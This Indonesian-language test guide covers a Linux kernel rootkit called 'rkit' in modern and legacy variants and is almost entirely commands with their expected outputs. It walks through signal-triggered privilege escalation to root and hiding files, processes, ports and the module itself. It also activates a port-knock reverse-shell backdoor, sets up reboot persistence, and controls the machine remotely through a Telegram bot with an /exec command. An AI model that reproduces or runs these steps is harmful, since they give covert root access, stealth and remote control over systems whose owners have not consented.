# =============================================
#  UJI CEPAT ROOTKIT — PANDUAN LENGKAP (DUA JALUR)
# =============================================
#  Kenali backend dulu (WAJIB sebelum pilih perintah):
#     lsmod | grep rkit
#       rkit4x  -> LEGACY  (2.6-4.19)   -> BAGIAN B
#       rkit    -> MODERN  (5.0-6.8)    -> BAGIAN A
#       rkit6x  -> NEWEST  (6.9+)       -> BAGIAN A
#     rkit status jalan = modern; error /proc/rkit = legacy
#
#  Aturan jujur (batas desain v1):
#   - akses PATH LANGSUNG selalu tembus (file tersembunyi bisa dibuka
#     via path penuh; ps -p <pid> tetap menemukan pid tersembunyi)
#   - ss (netlink) bisa tetap melihat port yang disembunyikan dari
#     /proc/net/tcp -> catat hasilnya (lihat docs/DETECTION.md)
#   - status ada di docs/KERNEL_COMPAT.md — naikkan HANYA setelah lolos
# =============================================


# =============================================
#  BAGIAN A — MODERN / NEWEST (CLI + /proc/rkit)
# =============================================
#  CLI: /rootkit/control/cli/rkit
#  (contoh di mesin 5.15.0-198 portal-1-new; sesuaikan path repo)

1. STATUS AWAL
   /rootkit/control/cli/rkit status

2. LPE — dari user biasa
   runuser -u nobody -- sh -c 'kill -s 63 1 && id'
   -> diharapkan: uid=0(root) + dmesg "root diberikan ke pid ..."

3. HIDE FILE (by nama persis)
   touch /tmp/tesrahasia.txt
   ls /tmp | grep tesrahasia                     # TERLIHAT
   /rootkit/control/cli/rkit hide file tesrahasia.txt
   ls /tmp | grep tesrahasia                     # KOSONG (tersembunyi)
   ls -la /tmp/tesrahasia.txt                    # path langsung tetap jalan (batas v1)
   /rootkit/control/cli/rkit unhide file tesrahasia.txt

3b. HIDE FOLDER (mekanisme SAMA — filter nama entri, file ATAU folder)
    mkdir /tmp/rahasia-folder
    /rootkit/control/cli/rkit hide file rahasia-folder
    ls /tmp | grep rahasia-folder                # KOSONG
    /rootkit/control/cli/rkit unhide file rahasia-folder

4. HIDE PID
   sleep 600 &
   SP=$!
   /rootkit/control/cli/rkit hide pid $SP
   ps aux | grep -w $SP | grep -v grep           # KOSONG
   /rootkit/control/cli/rkit unhide pid $SP
   kill $SP
   # hidepid TIDAK ikut reboot (PID berubah) — re-hide otomatis:
   #   tools/rkit-rehide.sh (pola proses -> pgrep -> hide pid)

5. HIDE PORT (koneksi)
   python3 -m http.server 8080 &
   /rootkit/control/cli/rkit hide port 8080
   cat /proc/net/tcp | grep -i1F90               # KOSONG (8080=0x1F90)
   ss -tlnp | grep 8080                          # CATAT hasilnya (netlink = batas jujur)
   /rootkit/control/cli/rkit unhide port 8080
   pkill -f http.server

6. SELF-HIDE MODUL — urutan WAJIB
   /rootkit/control/cli/rkit hide mod
   lsmod | grep rkit                             # KOSONG
   /rootkit/control/cli/rkit unhide mod          # ⚠️ WAJIB sebelum rmmod!
   lsmod | grep rkit                             # muncul lagi
   (lupa unhide -> rmmod gagal "not currently loaded" -> harus reboot)

7. UNLOAD BERSIH
   rmmod rkit          # (newest: rmmod rkit6x)
   dmesg | tail -3                               # "dilepas", TANPA OOPS

8. BACKDOOR — mati default
   timeout 3 bash -c 'echo knock > /dev/tcp/127.0.0.1/1337' || echo "OK: NONAKTIF"

9. BACKDOOR — AKTIF (reload dengan param)
   rmmod rkit
   insmod /rootkit/backend/modern_5x_6x/kernel/rkit.ko backdoor_ip=127.0.0.1 backdoor_port=4444 knock_port=1337
   # terminal A :  nc -l 4444
   # terminal B :  timeout 3 bash -c 'echo knock > /dev/tcp/127.0.0.1/1337'
   -> shell masuk di A -> ketik id
   (throttle: knock ke-2 dalam 5 dtk diabaikan = hanya 1 shell)

10. STATE + REBOOT (persistensi — CLI menulis state sendiri)
    /rootkit/control/cli/rkit hide file bintang.txt
    cat /var/lib/rkit/state                      # ada baris: name bintang.txt
    reboot
    /rootkit/control/cli/rkit status             # daftar masih ada = boot-restore OK
    lsmod | grep rkit                            # modul hidup lagi tanpa intervensi

11. TELEGRAM (opsional — di mesin modern /hide bot AKTIF penuh)
    cd /rootkit && cp config.example.ini config.ini   # isi token + chat id + CONTROL_MODE=telegram
    sudo bash install.sh                              # daemon start + cron @reboot

12. PASCA-UJI
    /rootkit/control/cli/rkit unhide file bintang.txt
    rmmod rkit
    dmesg | grep -iE 'oops|BUG:' | tail -5       # harus KOSONG


# =============================================
#  BAGIAN B — LEGACY (2.6 – 4.19: sinyal + param insmod)
# =============================================
#  Kenali: lsmod -> rkit4x | install.sh cetak "interface: legacy"
#  TIDAK ada /proc/rkit, TIDAK ada CLI — kontrol via:
#    - sinyal: kill -s 63 (LPE) / 64 (hide modul) / 62 (tampilkan)
#    - param : insmod ... hide=... hidepid=... hideport=...
#  WAJIB: kill -s SPASI (bash menolak -s63 menempel)
#  Ubah daftar = RELOAD (rmmod+insmod, tulis ULANG semua nama)

1. IDENTIFIKASI + STATUS
   lsmod | grep rkit                            # rkit4x = legacy
   dmesg | grep l4x | tail -5                   # harap: "getdents+kill dipasang",
                                                # conn-hide4/4, self-hide siap

2. LPE — dari user biasa
   runuser -u nobody -- sh -c 'kill -s 63 1 && id'
   -> uid=0(root) + dmesg "l4x: root diberikan ke pid ..."
   (terminal senyap = normal; bukti di dmesg)

3. HIDE FILE + FOLDER (nama persis, via reload)
   touch /tmp/uji.txt && mkdir /tmp/uji-folder
   rmmod rkit4x && insmod /rootkit/backend/legacy_4x/kernel/rkit4x.ko hide=uji.txt,uji-folder
   ls /tmp | grep uji                            # KOSONG (keduanya)
   ls -la /tmp/uji.txt                           # path langsung tetap jalan (batas v1)
   # ubah daftar? TULIS ULANG semua: hide=nama1,nama2 (daftar hilang saat rmmod)

4. HIDE PID (hidepid= —1 field, boleh banyak dipisah koma)
   sleep 600 &
   SP=$!
   rmmod rkit4x && insmod /rootkit/backend/legacy_4x/kernel/rkit4x.ko hidepid=$SP
   ps aux | grep -w $SP | grep -v grep           # KOSONG
   ls /proc | grep -x $SP                        # entri hilang
   cat /proc/$SP/comm                            # masih terbaca (path langsung)
   kill $SP
   rmmod rkit4x && insmod /rootkit/backend/legacy_4x/kernel/rkit4x.ko   # reload plain = daftar bersih

5. HIDE PORT (hideport= + cek /proc/net/tcp)
   (python3 -m http.server 8080 &)
   rmmod rkit4x && insmod /rootkit/backend/legacy_4x/kernel/rkit4x.ko hideport=8080
   cat /proc/net/tcp | grep -i1F90               # KOSONG (8080=0x1F90)
   cat /proc/net/tcp6 | grep -i1F90 || echo V6-JUGA-HILANG
   ss -tln | grep 8080                           # CATAT: netlink = batas jujur
   pkill -f http.server
   rmmod rkit4x && insmod /rootkit/backend/legacy_4x/kernel/rkit4x.ko   # bersih

6. SELF-HIDE MODUL (sinyal — urutan WAJIB)
   kill -s 64 1
   lsmod | grep rkit                             # KOSONG (dmesg: "modul disembunyikan")
   kill -s 62 1
   lsmod | grep rkit                             # muncul lagi (dmesg: "dikembalikan")
   ⚠️ lupa 62 -> rmmod tak menemukan modul -> harus reboot

7. UNLOAD BERSIH
   rmmod rkit4x
   dmesg | tail -3                               # "dilepas — tabel syscall dipulihkan", TANPA OOPS

8. BACKDOOR — mati default (state normal)
   timeout 3 bash -c 'echo knock > /dev/tcp/127.0.0.1/1337' || echo "OK: NONAKTIF"

9. BACKDOOR — AKTIF (reload dengan param)
   rmmod rkit4x
   insmod /rootkit/backend/legacy_4x/kernel/rkit4x.ko backdoor_ip=127.0.0.1 backdoor_port=4444 knock_port=1337
   # dmesg: "backdoor AKTIF — knock TCP1337 ->127.0.0.1:4444"
   # terminal A :  nc -l 4444
   # terminal B :  timeout 3 bash -c 'echo knock > /dev/tcp/127.0.0.1/1337'
   -> shell masuk; throttle5 dtk (knock ke-2 diabaikan)
   rmmod + insmod plain untuk kembali bersih

10. STATE BOOT (persistensi — legacy TANPA CLI, tulis MANUAL)
    echo "name rahasia.txt" >> /var/lib/rkit/state
    echo "port8080" >> /var/lib/rkit/state
    reboot
    dmesg | grep daftar | tail -1                # "daftar hide =1 nama,1 port" = restore OK
    cat /var/lib/rkit/state
    # PID TIDAK ditulis ke state — sengaja (PID berubah tiap boot)

11. TELEGRAM (opsional)
    cd /rootkit && cp config.example.ini config.ini    # token + CONTROL_MODE=telegram
    sudo bash install.sh                                # daemon + cron @reboot
    # /hide bot TIDAK jalan di legacy — pakai /exec:
    #   /exec rmmod rkit4x && insmod /rootkit/backend/legacy_4x/kernel/rkit4x.ko hide=.rkit
    #   /exec kill -s 64 1     (self-hide via bot)

12. PASCA-UJI (bersih-bersih)
    rmmod rkit4x
    dmesg | grep -icE 'oops|BUG:'               # harus0


# =============================================
#  SELESAI
# =============================================
#  Pola sinyal (dua-duanya berlaku LPE):  kill -s 63 LPE
#                                        kill -s 64 hide modul (legacy)
#                                        kill -s 62 tampilkan  (legacy)
#  Rekap status uji: docs/KERNEL_COMPAT.md (🚀 s/d ✅ per versi kernel)
# =============================================
